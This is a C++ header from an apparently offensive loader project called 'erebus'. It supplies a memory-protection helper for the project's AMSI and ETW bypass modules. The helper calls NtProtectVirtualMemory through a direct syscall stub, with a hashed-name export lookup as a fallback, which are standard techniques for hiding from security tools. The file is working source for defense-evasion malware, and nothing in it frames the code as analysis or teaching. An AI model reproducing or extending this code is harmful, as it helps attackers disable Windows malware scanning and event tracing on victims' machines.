#pragma once
#ifndef EREBUS_EVASION_UTILS_HPP
#define EREBUS_EVASION_UTILS_HPP

// Shared inline helpers used by evasion.cpp, amsi_bypass.cpp, and etw_bypass.cpp.
// Must be included AFTER loader.hpp - depends on typeNtProtectVirtualMemory,
// ImportModule, GetProcAddressC, and H() being in scope.

#include "syscall_backend.hpp"

namespace erebus {
namespace evasion {

    // ------------------------------------------------------------------
    // Protection flip helper using NtProtectVirtualMemory.
    // Returns TRUE on success, fills *oldProtect with the prior value.
    // Defined inline so each TU that includes this header gets its own
    // copy - avoids multiple-definition errors across translation units.
    // ------------------------------------------------------------------
    static inline BOOL FlipProtection(LPVOID addr, SIZE_T size, ULONG newProtect, PULONG oldProtect)
    {
        typeNtProtectVirtualMemory NtProtectVirtualMemory =
            (typeNtProtectVirtualMemory)GetSyscallStub(H("NtProtectVirtualMemory"));

        if (!NtProtectVirtualMemory) {
            HMODULE ntdll = ImportModule("ntdll.dll");
            if (!ntdll) return FALSE;
            NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
                erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));
            if (!NtProtectVirtualMemory) return FALSE;
        }

        PVOID base = addr;
        SIZE_T region = size;
        NTSTATUS status = NtProtectVirtualMemory(
            (HANDLE)(LONG_PTR)-1,
            &base,
            &region,
            newProtect,
            oldProtect
        );
        return NT_SUCCESS(status);
    }

} // namespace evasion
} // namespace erebus

#endif // EREBUS_EVASION_UTILS_HPP
